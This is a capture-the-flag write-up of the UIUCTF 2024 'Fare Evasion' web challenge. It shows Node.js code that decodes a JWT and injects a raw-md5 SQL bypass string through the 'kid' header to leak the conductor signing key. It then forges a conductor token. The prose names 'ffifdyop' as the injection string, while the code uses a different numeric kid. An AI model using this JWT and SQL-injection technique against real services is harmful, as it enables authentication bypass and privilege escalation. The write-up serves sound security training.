- Challenge name: Fare Evasion
- Author: Louis
- Description: 
SIGPwny Transit Authority needs your fares, but the system is acting a tad odd. We'll let you sign your tickets this time!
- Solves: 173
- Key: uiuctf{sigpwny_does_not_condone_turnstile_hopping!}
- Solver: `Flex` in `SpeedBambooFox`

# Overview

In this challenge, the challenge provides a website just like the Mini Metro style offical UIUCTF 2024 website and explain metro cannot run without fares, and there are two buttons, one for I'm a Passenger that can be clicked, and another for I'm a conductor that can't be clicked, as shown below:
![The Website](./images/image1.png)

When we click the "I'm a Passenger" button, an alert appears with the message, as illustrated below:
![The Website](./images/image2.png)

Too bad:\(, we need conductor privilege to get in the system.

# Exploration

## The JWT in Cookies

When I dig into the cookies, there is a  `access_token` in the cookie, which is encoded as a JWT.

![The Website](./images/image4.png)

To decode this JWT, I wrote a simple program:
```
const jwt = require('jsonwebtoken');
const token = 'eyJhbGciOiJIUzI1NiIsImtpZCI6InBhc3Nlbmdlcl9rZXkiLCJ0eXAiOiJKV1QifQ.eyJ0eXBlIjoicGFzc2VuZ2VyIn0.EqwTzKXS85U_CbNznSxBz8qA1mDZOs1JomTXSbsw0Zs';
const decoded = jwt.decode(token, { complete: true });

if (decoded) {
    const header = decoded.header;
    const payload = decoded.payload;

    console.log('Header:', header);
    console.log('Payload:', payload);
} else {
    console.error('Invalid token');
}
```


After we decode `access_token`, the JWT's header is
```
Header: { alg: 'HS256', kid: 'passenger_key', type: 'JWT' }
```
and payload is:
```
Payload: { type: 'passenger' }
```

This JWT indicates the token of a passenger, which contains a `kid` that would be useful for the exploit.

## Secret in alert
![The Website](./images/image2.png)

There's something in alert that has a bunch of random code and a secret, where the secret is `a_boring_passenger_signing_key_? `, it indicate that it is the JWT signing key of passenagers.

We can write a program to verify the correctness of its key:

```
const jwt = require('jsonwebtoken');
const secretKey = 'a_boring_passenger_signing_key_?';
const token = 'eyJhbGciOiJIUzI1NiIsImtpZCI6InBhc3Nlbmdlcl9rZXkiLCJ0eXAiOiJKV1QifQ.eyJ0eXBlIjoicGFzc2VuZ2VyIn0.EqwTzKXS85U_CbNznSxBz8qA1mDZOs1JomTXSbsw0Zs';

try {
    const decoded = jwt.verify(token, secretKey);
    console.log(decoded);
} catch (err) {
    console.error('Invalid token', err);
}
```

The output confirms the JWT signing key for passengers:
```
{ type: 'passenger' }
```

## DB query statement in Body

There is something that caught my attention in the \<script\> section:
``` html
<script>
    async function pay() {
      // i could not get sqlite to work on the frontend :(
      /*
        db.each(`SELECT * FROM keys WHERE kid = '${md5(headerKid)}'`, (err, row) => {
        ???????
       */
      const r = await fetch("/pay", { method: "POST" });
      const j = await r.json();
      document.getElementById("alert").classList.add("opacity-100");
      // todo: convert md5 to hex string instead of latin1??
      document.getElementById("alert").innerText = j["message"];
      setTimeout(() => { document.getElementById("alert").classList.remove("opacity-100") }, 5000);
    }
  </script>
```

In the `pay()` function, it sends a request to the `/pay"` endpoint to fetch the resource from the server, and then displays the corresponding alert, and I noticed that when we press the `I'm a passenger` button, it triggers the `pay()` funciton, which indicates that the endpoint will go through some kind of authentication, then send back the corresponding response.

And the comment shows the most important hint of the challenge, before throwing in the query statement, the `kid` goes through an md5 hash, which means we can do a sql injection by modifying the `kid` and then by passing through md5, and the `kid` in the JWT payload can be mapped to the  `kid` in the annotated db query statement.

# Exploit

Now We have an idea, if we can do sql injection to get the conductor JWT signed key, and fake conductor's JWT, we may be able to gain conductor's entry into the system.

## Bypass through MD5

Now, we guess that the server side is running a piece of code that is annotated in the HTML body:
```
db.each(`SELECT * FROM keys WHERE kid = '${md5(headerKid)}'`, (err, row) => { ???????
```

There exists a most commonly used bypass trick: `ffifdyop`, whose corresponding 32-bit md5 code is `276f722736c95d99e921722cf9ed621c`, which is converted to ASCII as `'or'6<trash>*`,  and now the code will look like this

```
db.each(`SELECT * FROM keys WHERE kid = 'or'6<trash>*`, (err, row) => { ???????``
```

Now the query statement will select all columns in `keys` table,  we can inject `ffifdyop` in `kid` field of JWT header, here is sample code for generating a JWT that can perform SQL injection:
```
const jwt = require('jsonwebtoken');
const originalJwt = 'eyJhbGciOiJIUzI1NiIsImtpZCI6InBhc3Nlbmdlcl9rZXkiLCJ0eXAiOiJKV1QifQ.eyJ0eXBlIjoicGFzc2VuZ2VyIn0.EqwTzKXS85U_CbNznSxBz8qA1mDZOs1JomTXSbsw0Zs';
const secretKey = 'a_boring_passenger_signing_key_?';

let decodedPayload;
try {
  decodedPayload = jwt.verify(originalJwt, secretKey);
} catch (err) {
  console.error('Invalid token:', err.message);
  return;
}

const newJwt = jwt.sign(decodedPayload, secretKey, { algorithm: 'HS256', header: { alg: 'HS256', kid: `129581926211651571912466741651878684928`, typ: 'JWT' } });

console.log('Original JWT:', originalJwt);
console.log('New JWT:', newJwt);
```

After inject the new JWT, we can click the again to see the alert, as shown in the image below: 

![The Website](./images/image5.png)

We can see that the conductor's key `conductor_key_873affdf8cc36a592ec790fc62973d55f4bf43b321bf1ccc0514063370356d5cddb4363b4786fd072d36a25e0ab60a78b8df01bd396c7a05cccbbb3733ae3f8e` appears in the alert

This key is what we want, and we can use it to generate the conductor's JWT. To generate a new conductor's key, I wrote a program as below:

```
const jwt = require('jsonwebtoken');

const secretKey = 'conductor_key_873affdf8cc36a592ec790fc62973d55f4bf43b321bf1ccc0514063370356d5cddb4363b4786fd072d36a25e0ab60a78b8df01bd396c7a05cccbbb3733ae3f8e';

const newJwt = jwt.sign({ type: 'conductor' }, secretKey, { algorithm: 'HS256', header: { alg: 'HS256', kid: `129581926211651571912466741651878684928`, typ: 'JWT' } });
console.log(newJwt)
```

We modify the `access token` in cookies to the conductor JWT we generated, and click the `I'm a Passenger` agagin, the flag appears in alert, as shown in the image below:

![The Website](./images/image6.png)



